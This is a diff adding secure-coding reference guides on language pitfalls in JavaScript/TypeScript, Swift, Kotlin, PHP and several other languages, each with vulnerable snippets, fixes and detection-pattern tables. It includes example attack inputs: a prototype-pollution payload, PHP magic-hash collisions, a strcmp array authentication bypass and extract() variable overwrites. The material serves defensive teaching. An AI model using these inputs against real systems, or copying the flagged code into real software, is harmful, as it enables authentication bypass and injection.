+```javascript
+// DANGEROUS: Bracket notation with user input
+const obj = { admin: false };
+const key = userInput;  // Could be "__proto__", "constructor", etc.
+obj[key] = true;  // Prototype pollution!
+
+// DANGEROUS: in operator checks prototype chain
+"toString" in {}  // true - inherited from Object.prototype
+
+// Fix: Use hasOwnProperty
+({}).hasOwnProperty("toString")  // false
+Object.hasOwn({}, "toString")    // false (ES2022)
+```
+
+## Async/Await Pitfalls
+
+```javascript
+// DANGEROUS: Unhandled promise rejection
+async function riskyOperation() {
+    throw new Error("oops");
+}
+riskyOperation();  // Unhandled rejection - may crash Node.js
+
+// DANGEROUS: Missing await
+async function process() {
+    validateInput();  // Forgot await - validation not complete!
+    doSensitiveOperation();
+}
+
+// DANGEROUS: Sequential when parallel is possible
+async function slow() {
+    const a = await fetchA();  // Waits
+    const b = await fetchB();  // Then waits
+    return a + b;
+}
+
+// Better: parallel
+async function fast() {
+    const [a, b] = await Promise.all([fetchA(), fetchB()]);
+    return a + b;
+}
+```
+
+## JSON Parse Issues
+
+```javascript
+// DANGEROUS: __proto__ in JSON
+JSON.parse('{"__proto__": {"isAdmin": true}}');
+// Creates object with __proto__ key, but doesn't pollute
+
+// However, if merged into another object:
+Object.assign({}, JSON.parse(userInput));
+// Can pollute if userInput has __proto__
+
+// DANGEROUS: Large numbers lose precision
+JSON.parse('{"id": 9007199254740993}');
+// id becomes 9007199254740992 (precision loss)
+```
+
+## TypeScript-Specific
+
+```typescript
+// DANGEROUS: Type assertions bypass checking
+const user = userData as Admin;  // No runtime check!
+user.adminMethod();  // Runtime error if not actually Admin
+
+// DANGEROUS: any escapes type system
+function process(data: any) {
+    data.whatever();  // No type checking
+}
+
+// DANGEROUS: Non-null assertion
+function greet(name: string | null) {
+    console.log(name!.toUpperCase());  // Crash if null!
+}
+
+// DANGEROUS: Type guards can lie
+function isAdmin(user: User): user is Admin {
+    return true;  // Wrong! TypeScript trusts this
+}
+```
+
+## Detection Patterns
+
+| Pattern | Risk |
+|---------|------|
+| `==` instead of `===` | Type coercion bugs |
+| `obj[userInput]` | Prototype pollution |
+| `/__proto__|constructor|prototype/` in merge | Pollution vectors |
+| `(a+)+`, `(.*)+` in regex | ReDoS |
+| `parseInt(x)` without radix | Parsing inconsistency |
+| `eval(`, `Function(`, `setTimeout(string` | Code execution |
+| `.sort()` on numbers without comparator | String sort |
+| `as Type` assertions | Runtime type mismatch |
+| `!` non-null assertion | Null pointer crash |
+| Missing `await` before async call | Race condition |
+
+
+### Lang Swift
+
+# Swift Sharp Edges
+
+## Force Unwrapping
+
+```swift
+// DANGEROUS: Crashes on nil
+let value = optionalValue!  // Runtime crash if nil
+
+// Common in:
+let cell = tableView.dequeueReusableCell(...)!
+let url = URL(string: userInput)!
+let data = try! JSONDecoder().decode(...)
+
+// DANGEROUS: Implicitly Unwrapped Optionals
+var name: String!  // IUO - crashes if accessed while nil
+
+class ViewController: UIViewController {
+    @IBOutlet weak var label: UILabel!  // Nil before viewDidLoad
+}
+```
+
+**Fix**: Use optional binding or nil-coalescing:
+```swift
+if let value = optionalValue {
+    use(value)
+}
+let value = optionalValue ?? defaultValue
+guard let value = optionalValue else { return }
+```
+
+## try! and try?
+
+```swift
+// DANGEROUS: try! crashes on error
+let data = try! Data(contentsOf: url)
+
+// DANGEROUS: try? silently converts error to nil
+let data = try? Data(contentsOf: url)
+// No way to know if failure was "file not found" or "permission denied"
+
+// DANGEROUS: Ignoring error completely
+do {
+    try riskyOperation()
+} catch {
+    // Error swallowed
+}
+```
+
+**Fix**: Handle errors explicitly:
+```swift
+do {
+    let data = try Data(contentsOf: url)
+} catch let error as NSError where error.code == NSFileNoSuchFileError {
+    // Handle file not found
+} catch {
+    // Handle other errors
+}
+```
+
+## as! Force Cast
+
+```swift
+// DANGEROUS: Crashes if cast fails
+let user = object as! User
+
+// Common antipattern:
+let cell = tableView.dequeueReusableCell(...) as! CustomCell
+// Crashes if wrong identifier or wrong class
+```
+
+**Fix**: Use conditional cast:
+```swift
+if let user = object as? User {
+    use(user)
+}
+guard let user = object as? User else {
+    return  // or handle error
+}
+```
+
+## String/NSString Bridging
+
+```swift
+// DANGEROUS: Different indexing semantics
+let nsString: NSString = "café"
+let swiftString = nsString as String
+
+nsString.length        // 5 (UTF-16 code units)
+swiftString.count      // 4 (extended grapheme clusters)
+
+// Range confusion:
+let range = nsString.range(of: "é")  // NSRange (UTF-16)
+// Can't directly use with String (uses String.Index)
+
+// DANGEROUS: Emoji handling
+let emoji = "👨‍👩‍👧‍👦"  // Family emoji
+emoji.count           // 1 (grapheme cluster)
+emoji.utf16.count     // 11 (UTF-16)
+(emoji as NSString).length  // 11
+```
+
+## Reference Cycles
+
+```swift
+// DANGEROUS: Strong reference cycles cause memory leaks
+class Person {
+    var apartment: Apartment?
+}
+class Apartment {
+    var tenant: Person?  // Strong reference
+}
+
+let john = Person()
+let apt = Apartment()
+john.apartment = apt
+apt.tenant = john  // Cycle! Neither deallocated
+
+// DANGEROUS: Closures capture self strongly
+class MyClass {
+    var callback: (() -> Void)?
+
+    func setup() {
+        callback = {
+            self.doSomething()  // Strong capture of self
+        }
+    }
+}
+```
+
+**Fix**: Use `weak` or `unowned`:
+```swift
+class Apartment {
+    weak var tenant: Person?  // Weak breaks cycle
+}
+
+callback = { [weak self] in
+    self?.doSomething()
+}
+```
+
+## Array/Dictionary Thread Safety
+
+```swift
+// DANGEROUS: Collections are not thread-safe
+var array = [Int]()
+
+// Thread 1:
+array.append(1)
+
+// Thread 2:
+array.append(2)
+
+// Crash or corruption possible!
+```
+
+**Fix**: Use serial dispatch queue, locks, or actors (Swift 5.5+):
+```swift
+actor SafeStorage {
+    private var items = [Int]()
+
+    func add(_ item: Int) {
+        items.append(item)
+    }
+}
+```
+
+## Numeric Overflow
+
+```swift
+// In debug: crashes (overflow check)
+// In release: also crashes by default (unlike C)
+let x: Int8 = 127
+let y = x + 1  // Fatal error: arithmetic overflow
+
+// BUT: If using &+ operators, wraps silently
+let y = x &+ 1  // -128 (wrapping)
+```
+
+This is safer than C, but `&+` operators can still cause issues.
+
+## Uninitialized Properties
+
+```swift
+// DANGEROUS: Accessing before initialization
+class MyClass {
+    var value: Int
+
+    init() {
+        print(value)  // Compile error in Swift, thankfully
+        value = 42
+    }
+}
+
+// BUT: @objc interop can bypass
+// AND: Unsafe pointers have no initialization guarantees
+```
+
+## Protocol Witness Table Issues
+
+```swift
+// DANGEROUS: Protocol with Self requirement
+protocol Equatable {
+    static func ==(lhs: Self, rhs: Self) -> Bool
+}
+
+// Can't use heterogeneously:
+var items: [Equatable] = [...]  // Error!
+// Must use type erasure or existentials
+```
+
+## KeyPath Subscript Confusion
+
+```swift
+// DANGEROUS: Similar syntax, different behavior
+struct User {
+    var name: String
+    subscript(key: String) -> String? { ... }
+}
+
+user["name"]       // Calls subscript
+user[keyPath: \.name]  // Uses KeyPath
+
+// Easy to confuse when debugging
+```
+
+## Codable Pitfalls
+
+```swift
+// DANGEROUS: Decoding fails silently with wrong types
+struct User: Codable {
+    var id: Int
+}
+
+// JSON: {"id": "123"}  // String, not Int
+// Throws DecodingError, but often caught broadly
+
+// DANGEROUS: Missing keys
+struct User: Codable {
+    var id: Int
+    var name: String  // Required
+}
+
+// JSON: {"id": 1}  // Missing "name"
+// Throws, but error message may not be clear
+```
+
+**Fix**: Use explicit CodingKeys and handle errors:
+```swift
+struct User: Codable {
+    var id: Int
+    var name: String?  // Optional for missing keys
+
+    enum CodingKeys: String, CodingKey {
+        case id
+        case name
+    }
+}
+```
+
+## Objective-C Interop
+
+```swift
+// DANGEROUS: Objective-C returns nullable even when Swift sees non-optional
+@objc func legacyMethod() -> NSString  // May actually return nil
+
+// DANGEROUS: Objective-C exceptions not caught by Swift
+// NSException bypasses Swift error handling
+
+// DANGEROUS: Objective-C performSelector
+let result = obj.perform(NSSelectorFromString(userInput))
+// Can call any method!
+```
+
+## Detection Patterns
+
+| Pattern | Risk |
+|---------|------|
+| `!` force unwrap | Crash on nil |
+| `as!` force cast | Crash on type mismatch |
+| `try!` | Crash on error |
+| `try?` without handling nil | Silent failure |
+| `String!` IUO types | Deferred crash |
+| Closure capturing `self` without `[weak self]` | Memory leak |
+| Collections modified from multiple threads | Race condition |
+| NSString/String conversion with ranges | Index mismatch |
+| `&+`, `&-`, `&*` operators | Silent overflow |
+| `@objc` methods returning non-optional | Nil bridge issues |
+
+
+### Lang Kotlin
+
+# Kotlin Sharp Edges
+
+## Platform Types from Java
+
+```kotlin
+// DANGEROUS: Java interop returns "platform types" (Type!)
+val result = javaLibrary.getValue()  // Type: String! (platform type)
+result.length  // NPE if Java returned null!
+
+// Kotlin doesn't know if Java code can return null
+// Platform types bypass null safety
+
+// Even "safe" Java annotations may not be recognized:
+// @NotNull in Java doesn't guarantee Kotlin sees it correctly
+```
+
+**Fix**: Explicitly declare nullability when calling Java:
+```kotlin
+val result: String? = javaLibrary.getValue()  // Treat as nullable
+val result: String = javaLibrary.getValue()   // Throws if null
+```
+
+## Not-Null Assertion (!!)
+
+```kotlin
+// DANGEROUS: !! throws on null
+val value = nullableValue!!  // KotlinNullPointerException
+
+// Common antipattern:
+val user = findUser(id)!!  // "I know it's not null"
+// Famous last words
+
+// DANGEROUS: Chained assertions
+val name = user!!.profile!!.name!!  // Triple jeopardy
+```
+
+**Fix**: Use safe calls and elvis operator:
+```kotlin
+val value = nullableValue ?: return
+val value = nullableValue ?: throw IllegalStateException("...")
+val name = user?.profile?.name ?: "default"
+```
+
+## Lateinit
+
+```kotlin
+// DANGEROUS: Accessing before initialization
+class MyClass {
+    lateinit var config: Config
+
+    fun process() {
+        config.value  // UninitializedPropertyAccessException if not set
+    }
+}
+
+// Can check with ::property.isInitialized but often forgotten
+if (::config.isInitialized) {
+    config.value
+}
+```
+
+**Better alternatives**:
+```kotlin
+// Lazy initialization
+val config: Config by lazy { loadConfig() }
+
+// Nullable with check
+var config: Config? = null
+fun process() {
+    val c = config ?: throw IllegalStateException("Not configured")
+}
+```
+
+## Data Class Copy Pitfalls
+
+```kotlin
+data class User(val name: String, val role: Role)
+
+// DANGEROUS: copy() can bypass immutability intentions
+val admin = User("Alice", Role.ADMIN)
+val notAdmin = admin.copy(role = Role.USER)  // Fine
+
+// But if User validates in constructor:
+data class User(val name: String, val role: Role) {
+    init {
+        require(name.isNotBlank()) { "Name required" }
+    }
+}
+
+// copy() BYPASSES the init block in some scenarios
+// Validation may not run on copy
+```
+
+## Companion Object Initialization
+
+```kotlin
+// DANGEROUS: Companion objects initialize lazily on first access
+class MyClass {
+    companion object {
+        val config = loadConfig()  // When does this run?
+    }
+}
+
+// First access triggers initialization
+// Can cause unexpected delays or errors at runtime
+// Order of initialization across classes is complex
+```
+
+## Coroutine Cancellation
+
+```kotlin
+// DANGEROUS: Not checking for cancellation
+suspend fun longOperation() {
+    while (true) {
+        heavyComputation()  // Doesn't check cancellation
+    }
+}
+
+// Cancel won't stop this coroutine!
+val job = launch { longOperation() }
+job.cancel()  // Coroutine keeps running
+
+// DANGEROUS: Swallowing CancellationException
+suspend fun wrapped() {
+    try {
+        suspendingFunction()
+    } catch (e: Exception) {
+        // CancellationException caught! Breaks cancellation
+    }
+}
+```
+
+**Fix**: Check for cancellation and rethrow CancellationException:
+```kotlin
+suspend fun longOperation() {
+    while (true) {
+        ensureActive()  // or yield()
+        heavyComputation()
+    }
+}
+
+catch (e: Exception) {
+    if (e is CancellationException) throw e
+    // handle other exceptions
+}
+```
+
+## Inline Class Boxing
+
+```kotlin
+@JvmInline
+value class UserId(val id: Int)
+
+// DANGEROUS: Boxing occurs in certain contexts
+fun process(id: UserId?) { }  // Nullable = boxed
+fun process(id: Any) { }      // Any = boxed
+val list: List<UserId>        // Generic = boxed
+
+// Performance benefit lost, but worse:
+// Two "equal" values may not be identical
+```
+
+## Scope Functions Confusion
+
+```kotlin
+// DANGEROUS: Wrong scope function leads to bugs
+val user = User()
+user.also {
+    it.name = "Alice"
+}.let {
+    return it.name  // 'it' is the user, 'this' is outer scope
+}
+
+// Easy to confuse:
+// let: it = receiver, returns lambda result
+// also: it = receiver, returns receiver
+// apply: this = receiver, returns receiver
+// run: this = receiver, returns lambda result
+// with: this = receiver, returns lambda result
+```
+
+## Delegation Pitfalls
+
+```kotlin
+// DANGEROUS: Property delegation evaluated lazily
+class Config {
+    val setting by lazy { loadExpensiveSetting() }
+}
+
+// Thread safety depends on lazy mode:
+by lazy { }                           // Synchronized (safe but slow)
+by lazy(LazyThreadSafetyMode.NONE) { } // Not safe!
+by lazy(LazyThreadSafetyMode.PUBLICATION) { } // Safe but may compute multiple times
+```
+
+## Reified Type Erasure
+
+```kotlin
+// DANGEROUS: Inline + reified still has limits
+inline fun <reified T> parse(json: String): T {
+    return gson.fromJson(json, T::class.java)
+}
+
+// Works for simple types, but:
+parse<List<String>>(json)  // T::class.java is just List, not List<String>
+// Generic type arguments still erased
+```
+
+## Sequence vs Iterable
+
+```kotlin
+// DANGEROUS: Sequences are lazy, Iterables are eager
+val list = listOf(1, 2, 3)
+
+// Eager - filter runs on all elements immediately
+list.filter { println("filter $it"); it > 1 }
+    .map { println("map $it"); it * 2 }
+    .first()
+// Prints: filter 1, filter 2, filter 3, map 2, map 3
+
+// Lazy - only processes needed elements
+list.asSequence()
+    .filter { println("filter $it"); it > 1 }
+    .map { println("map $it"); it * 2 }
+    .first()
+// Prints: filter 1, filter 2, map 2
+```
+
+But sequences can also surprise:
+```kotlin
+// DANGEROUS: Sequence operations return new sequences, not results
+val seq = listOf(1, 2, 3).asSequence()
+    .filter { it > 1 }
+    .map { it * 2 }
+// Nothing executed yet! Must terminate with toList(), first(), etc.
+```
+
+## Extension Function Shadowing
+
+```kotlin
+// DANGEROUS: Extension functions can shadow members
+class MyClass {
+    fun process() = "member"
+}
+
+fun MyClass.process() = "extension"  // Never called!
+
+val obj = MyClass()
+obj.process()  // "member" - members always win
+```
+
+## Detection Patterns
+
+| Pattern | Risk |
+|---------|------|
+| Java interop without explicit nullability | Platform type NPE |
+| `!!` assertion | Null pointer exception |
+| `lateinit` without isInitialized check | Uninitialized access |
+| `data class` with validation in init | copy() bypasses validation |
+| `suspend fun` without ensureActive/yield | Can't cancel |
+| `catch (e: Exception)` in coroutines | Swallows cancellation |
+| `@JvmInline` with nullable/generic | Unexpected boxing |
+| `by lazy(LazyThreadSafetyMode.NONE)` | Thread safety |
+| `asSequence()` without terminal op | Nothing executes |
+| Extension function same name as member | Extension never called |
+
+
+### Language Specific
+
+# Language-Specific Sharp Edges
+
+General programming footguns by language—not limited to cryptography.
+
+## C / C++
+
+### Integer Overflow is Undefined Behavior
+
+```c
+// DANGEROUS: Signed overflow is UB, compiler can optimize away checks
+int x = INT_MAX;
+if (x + 1 > x) {  // Compiler may assume always true (UB)
+    // Overflow check optimized away!
+}
+
+// DANGEROUS: Size calculations
+size_t size = user_count * sizeof(struct User);
+// If user_count * sizeof overflows, allocates tiny buffer
+void *buf = malloc(size);
+```
+
+**The Problem**: Signed integer overflow is undefined behavior. Compilers assume it never happens and optimize accordingly—including removing overflow checks.
+
+### Buffer Handling
+
+```c
+// DANGEROUS: No bounds checking
+char buf[64];
+strcpy(buf, user_input);      // Classic overflow
+sprintf(buf, "Hello %s", name); // Format + overflow
+gets(buf);                     // Never use, removed in C11
+
+// DANGEROUS: Off-by-one
+char buf[64];
+strncpy(buf, src, 64);        // NOT null-terminated if src >= 64!
+buf[63] = '\0';               // Must do manually
+```
+
+### Format Strings
+
+```c
+// DANGEROUS: User controls format
+printf(user_input);           // Format string attack
+syslog(LOG_INFO, user_input); // Same problem
+
+// SAFE: Format as literal
+printf("%s", user_input);
+```
+
+### Memory Cleanup
+
+```c
+// DANGEROUS: Secrets persist
+char password[64];
+// ... use password ...
+memset(password, 0, sizeof(password));  // May be optimized away!
+
+// SAFER: Use explicit_bzero or volatile
+explicit_bzero(password, sizeof(password));  // Won't be optimized
+```
+
+---
+
+## Go
+
+### Silent Integer Overflow
+
+```go
+// DANGEROUS: Overflow wraps silently (no panic!)
+var x int32 = math.MaxInt32
+x = x + 1  // Wraps to -2147483648, no error
+
+// This enables vulnerabilities in:
+// - Size calculations for allocations
+// - Loop bounds
+// - Financial calculations
+```
+
+**The Problem**: Unlike Rust (debug panics), Go silently wraps. Fuzzing may never find overflow bugs because they don't crash.
+
+### Slice Aliasing
+
+```go
+// DANGEROUS: Slices share backing array
+original := []int{1, 2, 3, 4, 5}
+slice1 := original[1:3]  // {2, 3}
+slice2 := original[2:4]  // {3, 4}
+
+slice1[1] = 999  // Modifies original AND slice2!
+// slice2 is now {999, 4}
+```
+
+### Interface Nil Confusion
+
+```go
+// DANGEROUS: Typed nil vs untyped nil
+var p *MyStruct = nil
+var i interface{} = p
+
+if i == nil {
+    // This is FALSE! i holds (type=*MyStruct, value=nil)
+    // An interface is only nil if both type and value are nil
+}
+
+// Common in error handling:
+func getError() error {
+    var err *MyError = nil
+    return err  // Returns non-nil error interface!
+}
+```
+
+### JSON Field Matching
+
+```go
+// DANGEROUS: Go's JSON decoder is case-insensitive
+type User struct {
+    Admin bool `json:"admin"`
+}
+
+// Attacker sends: {"ADMIN": true} or {"Admin": true}
+// Both match the "admin" field!
+
+// Also: duplicate keys - last one wins
+// {"admin": false, "admin": true} → Admin = true
+```
+
+**Fix**: Use `DisallowUnknownFields()` and consider exact-match libraries.
+
+### Defer in Loops
+
+```go
+// DANGEROUS: All defers execute at function end, not loop iteration
+for _, file := range files {
+    f, _ := os.Open(file)
+    defer f.Close()  // Files stay open until function returns!
+}
+// Can exhaust file descriptors on large loops
+```
+
+---
+
+## Rust
+
+### Integer Overflow Behavior Changes
+
+```rust
+// In debug builds: panics
+// In release builds: wraps silently!
+let x: u8 = 255;
+let y = x + 1;  // Debug: panic! Release: y = 0
+```
+
+**The Problem**: Behavior differs between debug and release. Bugs may only manifest in production.
+
+**Fix**: Use `wrapping_*`, `checked_*`, or `saturating_*` explicitly.
+
+### Unsafe Blocks
+
+```rust
+// DANGEROUS: Unsafe disables Rust's safety guarantees
+unsafe {
+    // Can create data races
+    // Can dereference raw pointers
+    // Can call unsafe functions
+    // Can access mutable statics
+}
+
+// Common in FFI—audit all unsafe blocks carefully
+```
+
+### Mem::forget Skips Destructors
+
+```rust
+// DANGEROUS: Resources never cleaned up
+let guard = Mutex::lock().unwrap();
+std::mem::forget(guard);  // Lock never released = deadlock
+
+// Also problematic for:
+// - File handles
+// - Memory mappings
+// - Cryptographic key cleanup
+```
+
+### Unwrap Panics
+
+```rust
+// DANGEROUS: Panics on None/Err
+let value = some_option.unwrap();  // Panics if None
+let result = fallible_fn().unwrap();  // Panics if Err
+
+// In libraries: propagate errors with ?
+// In binaries: use expect() with message, or handle properly
+```
+
+---
+
+## Swift
+
+### Force Unwrapping
+
+```swift
+// DANGEROUS: Crashes on nil
+let value = optionalValue!  // Runtime crash if nil
+
+// DANGEROUS: Implicitly unwrapped optionals
+var name: String!  // IUO - crashes if accessed while nil
+```
+
+### Bridge Type Surprises
+
+```swift
+// DANGEROUS: NSString/String bridging
+let nsString: NSString = "hello"
+let range = nsString.range(of: "é")  // UTF-16 range
+let swiftString = nsString as String
+// Range semantics differ between NSString (UTF-16) and String (grapheme clusters)
+```
+
+---
+
+## Java
+
+### Equality Confusion
+
+```java
+// DANGEROUS: Reference equality, not value equality
+String a = new String("hello");
+String b = new String("hello");
+if (a == b) {  // FALSE - different objects
+}
+
+Integer x = 128;
+Integer y = 128;
+if (x == y) {  // FALSE - outside cached range [-128, 127]
+}
+
+Integer p = 127;
+Integer q = 127;
+if (p == q) {  // TRUE - cached, but misleading
+}
+```
+
+### Type Erasure
+
+```java
+// DANGEROUS: Generic types erased at runtime
+List<String> strings = new ArrayList<>();
+List<Integer> ints = new ArrayList<>();
+
+// At runtime, both are just "List" - no type checking
+// Can cast incorrectly and get ClassCastException later
+
+// Also: can't do runtime checks
+if (obj instanceof List<String>) {  // Compile error
+}
+```
+
+### Serialization
+
+```java
+// DANGEROUS: Like pickle, arbitrary code execution
+ObjectInputStream ois = new ObjectInputStream(untrustedInput);
+Object obj = ois.readObject();  // Executes readObject() on malicious classes
+
+// "Gadget chains" in libraries enable RCE
+// Even without executing readObject(), deserialization triggers code
+```
+
+### Swallowed Exceptions
+
+```java
+// DANGEROUS: Empty catch blocks
+try {
+    sensitiveOperation();
+} catch (Exception e) {
+    // Silently swallowed - security failure masked
+}
+```
+
+---
+
+## Kotlin
+
+### Platform Types from Java
+
+```kotlin
+// DANGEROUS: Java returns can be null, but Kotlin doesn't know
+val result = javaLibrary.getValue()  // Platform type: String!
+result.length  // NPE if Java returned null!
+
+// Kotlin trusts Java's lack of nullability annotations
+```
+
+### Not-Null Assertion
+
+```kotlin
+// DANGEROUS: Throws NPE
+val value = nullableValue!!  // KotlinNullPointerException if null
+```
+
+### Lateinit Pitfalls
+
+```kotlin
+// DANGEROUS: Accessing before initialization throws
+lateinit var config: Config
+
+fun process() {
+    config.value  // UninitializedPropertyAccessException
+}
+```
+
+---
+
+## C#
+
+### Nullable Reference Types Opt-In
+
+```csharp
+// DANGEROUS: NRT is opt-in, not enforced by default
+// Project must enable: <Nullable>enable</Nullable>
+
+// Even when enabled, it's warnings only by default
+string? nullable = null;
+string nonNull = nullable;  // Warning, not error
+nonNull.Length;  // NullReferenceException at runtime
+```
+
+### Default Struct Values
+
+```csharp
+// DANGEROUS: Structs have default values that may be invalid
+struct Connection {
+    public string Host;  // Default: null
+    public int Port;     // Default: 0
+}
+
+var conn = default(Connection);
+// conn.Host is null, conn.Port is 0 - probably invalid
+```
+
+### IDisposable Leaks
+
+```csharp
+// DANGEROUS: Resources not disposed
+var conn = new SqlConnection(connectionString);
+conn.Open();
+// Exception here = connection never closed
+
+// SAFE: using statement
+using var conn = new SqlConnection(connectionString);
+conn.Open();
+// Disposed even on exception
+```
+
+---
+
+## PHP
+
+### Type Juggling
+
+```php
+// DANGEROUS: Loose comparison (==) does type coercion
+"0e123" == "0e456"  // TRUE - both are 0 in scientific notation
+"0" == false        // TRUE
+"" == false         // TRUE
+[] == false         // TRUE
+null == false       // TRUE
+
+// Magic hash comparison
+"0e462097431906509019562988736854" == "0"  // TRUE
+// MD5("240610708") starts with 0e... = compares as 0
+
+// SAFE: Strict comparison (===)
+"0e123" === "0e456"  // FALSE
+```
+
+### Variable Variables and Extract
+
+```php
+// DANGEROUS: User controls variable names
+$name = $_GET['name'];
+$$name = $_GET['value'];  // Variable variable - arbitrary assignment
+
+// DANGEROUS: Extract creates variables from array
+extract($_POST);  // Every POST param becomes a variable
+// Attacker sends: POST isAdmin=true → $isAdmin = true
+```
+
+### Unserialize
+
+```php
+// DANGEROUS: Like pickle, arbitrary object instantiation
+$obj = unserialize($user_input);
+
+// Triggers __wakeup(), __destruct() on crafted objects
+// Can chain to RCE via "POP gadgets" in libraries
+```
+
+---
+
+## JavaScript / TypeScript
+
+### Coercion Madness
+
+```javascript
+// DANGEROUS: == coerces types unpredictably
+"0" == false   // true
+"" == false    // true
+[] == false    // true
+[] == ![]      // true (wat)
+
+// SAFE: === for strict equality
+"0" === false  // false
+```
+
+### Prototype Pollution
+
+```javascript
+// DANGEROUS: Merging untrusted objects
+function merge(target, source) {
+    for (let key in source) {
+        target[key] = source[key];  // Includes __proto__!
+    }
+}
+
+// Attacker sends: {"__proto__": {"isAdmin": true}}
+merge({}, userInput);
+// Now ALL objects have isAdmin === true
+({}).isAdmin  // true
+```
+
+**Fix**: Check `hasOwnProperty`, use `Object.create(null)`, or safe merge libraries.
+
+### Regex DoS (ReDoS)
+
+```javascript
+// DANGEROUS: Catastrophic backtracking
+const regex = /^(a+)+$/;
+regex.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaa!");
+// Exponential time - freezes the event loop
+
+// Patterns to avoid: nested quantifiers (a+)+, (a*)*
+// Overlapping alternatives: (a|a)+
+```
+
+### ParseInt Radix
+
+```javascript
+// DANGEROUS: Radix not specified
+parseInt("08");   // 8 in modern JS, was 0 in old (octal)
+parseInt("0x10"); // 16 - hex prefix recognized
+
+// SAFE: Always specify radix
+parseInt("08", 10);  // 8
+```
+
+---
+
+## Python
+
+### Mutable Default Arguments
+
+```python
+# DANGEROUS: Default is shared across calls
+def append_to(item, target=[]):
+    target.append(item)
+    return target
+
+append_to(1)  # [1]
+append_to(2)  # [1, 2] - same list!
+
+# SAFE: Use None sentinel
+def append_to(item, target=None):
+    if target is None:
+        target = []
+    target.append(item)
+    return target
+```
+
+### Eval and Friends
+
+```python
+# DANGEROUS: Arbitrary code execution
+eval(user_input)      # Executes Python expression
+exec(user_input)      # Executes Python statements
+compile(user_input, '', 'exec')  # Compiles for later exec
+
+# Also via:
+input()  # In Python 2, equivalent to eval(raw_input())
+```
+
+### Late Binding Closures
+
+```python
+# DANGEROUS: Closures capture variable by reference
+funcs = []
+for i in range(3):
+    funcs.append(lambda: i)
+
+[f() for f in funcs]  # [2, 2, 2] - all see final i
+
+# SAFE: Capture by value with default argument
+funcs = []
+for i in range(3):
+    funcs.append(lambda i=i: i)
+
+[f() for f in funcs]  # [0, 1, 2]
+```
+
+### Is vs ==
+
+```python
+# DANGEROUS: 'is' checks identity, not equality
+a = 256
+b = 256
+a is b  # True - cached small integers
+
+a = 257
+b = 257
+a is b  # False - different objects!
+
+# Same string issue:
+s1 = "hello"
+s2 = "hello"
+s1 is s2  # True - interned
+
+s1 = "hello world"
+s2 = "hello world"
+s1 is s2  # Maybe - depends on interpreter
+```
+
+---
+
+## Ruby
+
+### Dynamic Execution
+
+```ruby
+# DANGEROUS: Arbitrary code execution
+eval(user_input)           # Executes Ruby code
+send(user_input, *args)    # Calls arbitrary method
+constantize(user_input)    # Gets arbitrary constant/class
+public_send(user_input)    # Calls public method by name
+
+# Rails-specific:
+params[:controller].constantize  # Class injection
+```
+
+### YAML.load
+
+```ruby
+# DANGEROUS: Arbitrary object instantiation (like pickle)
+YAML.load(user_input)
+
+# Attacker sends YAML that instantiates arbitrary objects
+# Can chain to RCE via "gadget" classes
+
+# SAFE: Use safe_load
+YAML.safe_load(user_input)
+```
+
+### Mass Assignment
+
+```ruby
+# DANGEROUS: All params assigned to model
+User.new(params[:user])  # If params includes {admin: true}...
+
+# Rails 4+ requires strong parameters:
+params.require(:user).permit(:name, :email)  # Explicitly allowlist
+```
+
+---
+
+## Quick Reference Table
+
+| Language | Primary Sharp Edges |
+|----------|-------------------|
+| C/C++ | Integer overflow UB, buffer overflows, format strings, memory cleanup |
+| Go | Silent int overflow, slice aliasing, interface nil, JSON case-insensitive |
+| Rust | Debug/release overflow difference, unsafe blocks, mem::forget |
+| Swift | Force unwrap, implicitly unwrapped optionals |
+| Java | == vs equals, type erasure, serialization, swallowed exceptions |
+| Kotlin | Platform types, !!, lateinit |
+| C# | NRT opt-in, default struct values, IDisposable leaks |
+| PHP | Type juggling (==), extract(), unserialize() |
+| JS/TS | == coercion, prototype pollution, ReDoS, parseInt radix |
+| Python | Mutable defaults, eval/exec/pickle, late binding, is vs == |
+| Ruby | eval/send/constantize, YAML.load, mass assignment |
+
+
+### Lang Php
+
+# PHP Sharp Edges
+
+## Type Juggling
+
+```php
+// DANGEROUS: Loose comparison (==) does type coercion
+"0e123" == "0e456"   // TRUE - both parsed as 0 (scientific notation)
+"0" == false         // TRUE
+"" == false          // TRUE
+"" == 0              // TRUE (in PHP < 8)
+[] == false          // TRUE
+null == false        // TRUE
+
+// Magic hash vulnerability
+md5("240610708") = "0e462097431906509019562988736854"
+md5("QNKCDZO")   = "0e830400451993494058024219903391"
+md5("240610708") == md5("QNKCDZO")  // TRUE!
+
+// Both start with "0e" followed by digits = parsed as 0.0
+```
+
+**Fix**: Use strict comparison `===`:
+```php
+"0e123" === "0e456"  // FALSE
+$hash1 === $hash2    // Compares actual strings
+```
+
+## strcmp Returns NULL on Error
+
+```php
+// DANGEROUS: strcmp type confusion
+if (strcmp($_POST['password'], $stored_password) == 0) {
+    authenticate();
+}
+
+// Attacker sends: password[]=anything (array instead of string)
+strcmp(array(), "password")  // Returns NULL, not -1 or 1
+
+// NULL == 0 is TRUE in PHP!
+// Authentication bypassed!
+```
+
+**Fix**: Validate input type and use `===`:
+```php
+if (is_string($_POST['password']) &&
+    strcmp($_POST['password'], $stored_password) === 0) {
+    authenticate();
+}
+```
+
+## Variable Variables and Extract
+
+```php
+// DANGEROUS: Variable variables
+$name = $_GET['name'];  // "isAdmin"
+$$name = $_GET['value']; // "true"
+// Creates $isAdmin = "true"
+
+// DANGEROUS: extract() creates variables from array
+extract($_POST);  // Every POST param becomes a variable!
+// Attacker sends POST: isAdmin=true → $isAdmin = true
+
+// Can overwrite existing variables:
+$isAdmin = false;
+extract($_POST);  // Attacker overwrites $isAdmin
+```
+
+**Fix**: Never use `extract()` with user input. Use explicit assignment.
+
+## Unserialize RCE
+
+```php
+// DANGEROUS: Like pickle, instantiates arbitrary objects
+$obj = unserialize($_GET['data']);
+
+// Attacker crafts serialized data that:
+// 1. Instantiates class with dangerous __wakeup() or __destruct()
+// 2. Chains through multiple classes ("POP gadgets")
+// 3. Achieves code execution
+
+// Common gadget chains in:
+// - Laravel, Symfony, WordPress, Magento
+// - phpggc tool generates payloads automatically
+```
+
+**Fix**: Never unserialize untrusted data. Use JSON instead.
+If you must, use `allowed_classes` parameter (PHP 7.0+):
+```php
+unserialize($data, ['allowed_classes' => false]);
+unserialize($data, ['allowed_classes' => ['SafeClass']]);
+```
+
+## preg_replace with /e Modifier
+
+```php
+// DANGEROUS: /e modifier executes replacement as PHP code
+// Removed in PHP 7.0, but legacy code still exists
+preg_replace('/.*/e', $_GET['code'], '');
+// Executes arbitrary PHP code!
+
